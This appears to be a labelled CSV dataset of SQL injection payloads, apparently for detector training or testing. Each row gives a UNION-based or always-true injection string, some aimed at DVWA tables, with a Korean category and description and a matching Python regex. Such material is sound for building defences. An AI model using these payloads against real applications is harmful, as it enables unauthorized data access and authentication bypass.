"' union select 1, 2, 3, 4, 5, 6, 7, 8, 9 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"98' union select 1, 2, 3, 4, 5, 6 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
"61' union select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
96' union select 1 #,UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
10' or true #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"' union select 1,column_name from information_schema.columns where table_name='guestbook' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
' or '1'='1' #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"42' union select 1,column_name from information_schema.columns where table_name='users' limit 3,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"94' union select 1,column_name from information_schema.columns where table_name='guestbook' limit 2,1 #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
"28' union select 1,column_name from information_schema.columns where table_name='users' and table_schema='dvwa' #",UNION 기반 정보 검색,column_name에 대한 정보를 얻으려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d*?\\s*?\\,\\s*?)*\\d*?\\s*?column_name"", re.IGNORECASE)"
74' or '1'='1' limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
83' or true limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
' or 1=1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
' or true limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
68' or '1'='1' limit 1 #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
"' union select 1, 2, 3, 4, 5, 6 #",UNION 기반 정보 검색,Column 수를 알아내려고 시도,"re.compile(""(\\d)*?\\'\\s*?union\\sselect\\s(\\d+\\s*?\\,\\s*?)*\\d+\\s*?(#)"", re.IGNORECASE)"
' or true #,논리적 조건 조작,논리적 조건을 항상 참으로 만들어 인증 우회,"re.compile(""(\\d)*?'\\s*?or\\s(1=1|true|\\'\\d*\\'=\\'\\d*\\')"", re.IGNORECASE)"
